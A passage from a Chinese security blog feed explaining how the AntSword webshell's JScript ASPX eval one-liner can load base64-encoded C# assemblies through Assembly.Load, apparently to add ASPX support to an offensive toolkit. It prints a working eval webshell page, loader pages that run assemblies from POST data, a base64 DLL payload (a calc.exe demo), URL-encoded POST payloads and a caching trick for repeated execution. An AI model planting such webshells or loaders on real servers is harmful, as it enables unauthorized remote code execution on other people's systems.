id="从Jscript到C">从Jscript到C#</h3><p>蚁剑用的是Jscript，然而冰蝎哥斯拉用的C#，那么能否用Jscript去调用C#呢？</p><p>答案是可以的，<a href="http://xn--4gq603bcz0bbwbp1i.net" target="_blank" rel="noopener">这里附一张.net</a> framework的框架图</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611631244033-5fc17c40-78d4-4345-b999-67d103ece651.png" alt="image"></p><p>可以看到最顶层的如C#,VB,Jscript等语言，他们的底层框架都是通用的，<a href="http://xn--3dsp36ail6a.net" target="_blank" rel="noopener">都是在.net</a> framework这个体系内。所以C#编译成的assembly在Jscript中是可以通用的。</p><p>那么Jscript如何将其加载进去呢？由于其中部分基类库Base Class Library(BCL)是共有的。而Assembly.Load刚好在System.Reflection这个命名空间下面，所以我们就可以在Jscript中调用System.Reflection.Assembly.Load来把C#的assembly加载到内存中。</p><p>这里可能会有同学问了，既然Jscript也是一门独立的语言，理论上C#能实现的他都能实现，为什么还要大费周折再去加载C#呢？</p><p>其实也不是没有想过直接用Jscript写。。。但是在实现的过程中发现太蛋疼了，Jscript基本搜不到什么文档，报错也搜不到，本人测试过VS，VS code，rider，都没有Jscript的补全跟高亮，开发起来非常难受。另外一个原因是很多开源工具都用的C#实现，采用assembly加载的方式稍微修改一下就可以快速复用。</p><h2 id="踩坑过程">踩坑过程</h2><p>前面扯了这么多主要是理论，当然实现中没有这么顺利。</p><p>首先新建一个Class Library项目，这里以弹计算器为例。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">using System.Diagnostics;</span><br><span class="line"></span><br><span class="line">namespace AntPayload</span><br><span class="line">&#123;</span><br><span class="line">    public class Run</span><br><span class="line">    &#123;</span><br><span class="line">        public override bool Equals(object obj)</span><br><span class="line">        &#123;</span><br><span class="line">            Process.Start(&quot;calc.exe&quot;);</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>项目自动编译或者手动编译为dll</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csc /t:library AntPayload.cs</span><br></pre></td></tr></table></figure><p>base64一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 -w 0 AntPayload.dll &gt; AntPayload.txt</span><br></pre></td></tr></table></figure><p>Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAEXJD2AAAAAAAAAAAOAAIiALATAAAAgAAAAGAAAAAAAANicAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAOQmAABPAAAAAEAAAIgDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAACsJQAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAPAcAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAIgDAAAAQAAAAAQAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAYJwAAAAAAAEgAAAACAAUAaCAAAEQFAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADZyAQAAcCgOAAAKJhcqHgIoDwAACioAAEJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAMwBAAAjfgAAOAIAACQCAAAjU3RyaW5ncwAAAABcBAAAFAAAACNVUwBwBAAAEAAAACNHVUlEAAAAgAQAAMQAAAAjQmxvYgAAAAAAAAACAAABRxUAAAkAAAAA+gEzABYAAAEAAAAQAAAAAgAAAAIAAAABAAAADwAAAA0AAAABAAAAAgAAAAAAbgEBAAAAAAAGAN8AzgEGAEwBzgEGACwAnAEPAO4BAAAGAFQAhAEGAMIAhAEGAKMAhAEGADMBhAEGAP8AhAEGABgBhAEGAGsAhAEGAEAArwEGAB4ArwEGAIYAhAEGAAwCfQEKAAQCnAEAAAAAAQAAAAAAAQABAAEAEAAZAhMAPQABAAEAUCAAAAAAxgD9ASkAAQBeIAAAAACGGJYBBgACAAAAAQBqAQkAlgEBABEAlgEGABkAlgEKACkAlgEQADEAlgEQADkAlgEQAEEAlgEQAEkAlgEQAFEAlgEQAFkAlgEQAGEAlgEVAGkAlgEQAHEAlgEQAIEAEwIaAHkAlgEGAC4ACwAuAC4AEwA3AC4AGwBWAC4AIwBfAC4AKwBvAC4AMwBvAC4AOwBvAC4AQwBfAC4ASwB1AC4AUwBvAC4AWwBvAC4AYwCNAC4AawC3AASAAAABAAAAAAAAAAAAAAAAABMAAAACAAAAAAAAAAAAAAAgAAoAAAAAAAIAAAAAAAAAAAAAACAAfQEAAAAAAAAAPE1vZHVsZT4AbXNjb3JsaWIAQW50UGF5bG9hZABHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAG9iagBBbnRQYXlsb2FkLmRsbABTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24ALmN0b3IAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAEVxdWFscwBQcm9jZXNzAE9iamVjdABTdGFydABSdW5UZXN0AAAAAAARYwBhAGwAYwAuAGUAeABlAAAADuw7XR6MQkeND6FGq61D8gAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECBQABEkEO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><br></pre></td></tr></table></figure><p>新建web项目，建立test.aspx测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    var Payload =Request.Form(&quot;data&quot;);</span><br><span class="line">    var myAssebly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));</span><br><span class="line">    var myPaylaod=myAssebly.CreateInstance(&quot;AntPayload.Run&quot;).Equals(this);</span><br><span class="line">    myPaylaod.Equals(this);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>POST：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=xxxx(上文中的payload)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611633232056-b2c8ef30-8d5c-4902-b9ed-d0ee60480a78.png" alt="image.png"></p><p>可以证实我们的猜想是成功的，可以用Jscript调用System.Reflection.Assembly.Load执行C#的payload。</p><p>由于蚁剑的aspx一句话是基于jscript的eval的，所以还要通过一层eval给他传进去。</p><p>web项目中新建base.aspx</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;%eval(Request.Item[&quot;ant&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure><p>POST:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ant=var%20Payload%20%3D%22xxxxxxxxx%22%3B%0Avar%20myAssebly%20%3D%20System.Reflection.Assembly.Load(Convert.FromBase64String(Payload))%3B%0Avar%20myPaylaod%3DmyAssebly.CreateInstance(%22AntPayload.Run%22).Equals(this)%3B%0AmyPaylaod.Equals(this)%3B</span><br></pre></td></tr></table></figure><p>发现第一次是可以正常调用的</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646490580-34f8d7bb-c91d-473c-9364-a8e39e98a277.png" alt="image.png"></p><p>但是第二次执行就会提示下面的错误</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646514517-119e0355-d225-4f92-9ecf-07a57c564ca3.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[A]AntPayload.Run 无法强制转换为 [B]AntPayload.Run。类型 A 源自“AntPayload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null”(在字节数组的上下文“LoadNeither”中)。类型 B 源自“AntPayload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null”(在字节数组的上下文“LoadNeither”中)。</span><br></pre></td></tr></table></figure><p>搜了一下发现没有什么有用的回答，猜测大概是跟java中类重复加载一样的报错。</p><p>所以就加了一层判断，如果当前存在 AntPayload.Run 这个类型的assembly就不重复进行加载。</p><p>新建项目test0.aspx测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> &lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"> var Payload=&quot;TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAP2QD2AAAAAAAAAAAOAAIiALATAAAAgAAAAGAAAAAAAAMicAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAOAmAABPAAAAAEAAAIgDAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAACoJQAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAOAcAAAAgAAAACAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAIgDAAAAQAAAAAQAAAAKAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAUJwAAAAAAAEgAAAACAAUAaCAAAEAFAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADZyAQAAcCgOAAAKJhcqHgIoDwAACioAAEJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAMwBAAAjfgAAOAIAACACAAAjU3RyaW5ncwAAAABYBAAAFAAAACNVUwBsBAAAEAAAACNHVUlEAAAAfAQAAMQAAAAjQmxvYgAAAAAAAAACAAABRxUAAAkAAAAA+gEzABYAAAEAAAAQAAAAAgAAAAIAAAABAAAADwAAAA0AAAABAAAAAgAAAAAAbgEBAAAAAAAGAN8A0gEGAEwB0gEGACwAoAEPAPIBAAAGAFQAhAEGAMIAhAEGAKMAhAEGADMBhAEGAP8AhAEGABgBhAEGAGsAhAEGAEAAswEGAB4AswEGAIYAhAEGABACfQEKAAgCoAEAAAAAAQAAAAAAAQABAAEAEACWARMAPQABAAEAUCAAAAAAxgABAikAAQBeIAAAAACGGJoBBgACAAAAAQBqAQkAmgEBABEAmgEGABkAmgEKACkAmgEQADEAmgEQADkAmgEQAEEAmgEQAEkAmgEQAFEAmgEQAFkAmgEQAGEAmgEVAGkAmgEQAHEAmgEQAIEAFwIaAHkAmgEGAC4ACwAuAC4AEwA3AC4AGwBWAC4AIwBfAC4AKwBvAC4AMwBvAC4AOwBvAC4AQwBfAC4ASwB1AC4AUwBvAC4AWwBvAC4AYwCNAC4AawC3AASAAAABAAAAAAAAAAAAAAAAABMAAAACAAAAAAAAAAAAAAAgAAoAAAAAAAIAAAAAAAAAAAAAACAAfQEAAAAAAAAAPE1vZHVsZT4AbXNjb3JsaWIAQW50UGF5bG9hZABHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAG9iagBBbnRQYXlsb2FkLmRsbABTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24AUnVuAC5jdG9yAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBFcXVhbHMAUHJvY2VzcwBPYmplY3QAU3RhcnQAAAAAABFjAGEAbABjAC4AZQB4AGUAAAA945IL3EDlTKxPqJUA/SMAAAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQIFAAESQQ4It3pc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;; </span><br><span class="line">    var type = Type.GetType(&quot;AntPayload.Run&quot;);</span><br><span class="line">    if (type != null)</span><br><span class="line">    &#123;</span><br><span class="line">        Response.Write(type + &quot; exists&quot;);</span><br><span class="line">        //var obj=System.Activator.CreateInstance(type);</span><br><span class="line">        //obj.Equals(&quot;&quot;);</span><br><span class="line">        var assembly = System.Reflection.Assembly.GetExecutingAssembly();</span><br><span class="line">        var obj = assembly.CreateInstance(&quot;AntPayload.Run&quot;);</span><br><span class="line">        obj.Equals(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        Response.Write(type + &quot; not exists&quot;);</span><br><span class="line">        var myAssebly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));</span><br><span class="line">        var myPaylaod = myAssebly.CreateInstance(&quot;AntPayload.Run&quot;);</span><br><span class="line">        myPaylaod.Equals(&quot;&quot;);</span><br><span class="line">        //myAssebly.GetType(&quot;AntPayload.Run&quot;).GetConstructor(new Type[0]).Invoke(null).Equals(&quot;&quot;);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>发现 Type.GetType 永远为undefined。以为是函数用的不对，后来又换了System.Reflection.Assembly.GetCallingAssembly().GetType，System.Reflection.Assembly.GetExecutingAssembly().GetType都不行。</p><p>接着发现虽然把代码直接写在jscript中可以多次稳定触发，如果把以上代码通过eval打进入仍然会报上面类型转换的错误。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646712047-0bef66ad-7558-4637-9cb8-6c7f971a73c9.png" alt="image.png"></p><p>另外还发现一些奇怪的地方，如果直接代码写在jscript文件中可以用这种写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var obj=System.Activator.CreateInstance(type);</span><br><span class="line">obj.Equals(&quot;&quot;);</span><br></pre></td></tr></table></figure><p>但是如果通过eval传进去就只能用这种写法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var assembly = System.Reflection.Assembly.GetExecutingAssembly();</span><br><span class="line">var obj = assembly.CreateInstance(&quot;AntPayload.Run&quot;);</span><br><span class="line">obj.Equals(&quot;&quot;);</span><br></pre></td></tr></table></figure><p>否则会报如下错误，谷歌也没查到怎么解决，神秘。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611648974375-35bf8f84-b053-4b04-84dd-9a4f405c2543.png" alt="image.png"></p><h2 id="问题解决">问题解决</h2><p>试了很多办法都失败了，后来谷歌搜到了一篇<a href="https://evolpin.wordpress.com/2012/11/11/invalidcastexception-when-using-assembly-loadfile/" target="_blank" rel="noopener">2012年的博客</a>遇到了同样的问题，大概意思是说两次的assembly被加载到了不同的上下文中，所以被当作成为不同的类，无法进行类型转换。</p><p>跟北辰师傅研究了一番后，北辰师傅想到一种方法：把第一次加载后的assembly的引用给存到当前Application的上下文中，即HttpContext.Current.Application这个类里面，然后再通过Application.Get(“ant”)拿到引用，然后反射，再获取实例化，这样就可以解决上下文不同的问题。</p><p>payload修改如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var Payload=&quot;xxxxx&quot;;</span><br><span class="line">HttpContext.Current.Application.Add(&quot;ant&quot;, System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)));</span><br><span class="line">HttpContext.Current.Application.Get(&quot;ant&quot;).GetType(&quot;AntPayload.Run&quot;).GetConstructor(new Type[0]).Invoke(null).Equals(this);</span><br></pre></td></tr></table></figure><p>然后通过eval打过去，此时就可以多次稳定触发payload了。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611647475255-93c68208-03b8-4790-bf97-a6f60b9e0215.png" alt="image.png"></p><h2 id="最后">最后</h2><p>特别感谢北辰师傅的交流探讨！</p><p><a href="http://xn--7br39t.net" target="_blank" rel="noopener">初学.net</a>，有些地方是凭借自己的理解写的，如果有说的不对的地方欢迎指出，以免误导他人。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;&lt;p&gt;最近想要给As-Exploits增加aspx类型的支持，就研究了一下冰蝎跟哥斯拉的实现。&lt;/p&gt;&lt;p&gt;由于冰蝎跟哥斯拉都采用的C#类型的shell，
      
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.tk/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>星球问答：一次jsp上传绕过的思考</title>
    <link href="https://yzddmr6.tk/posts/jsp-webshell-upload-bypass/"/>
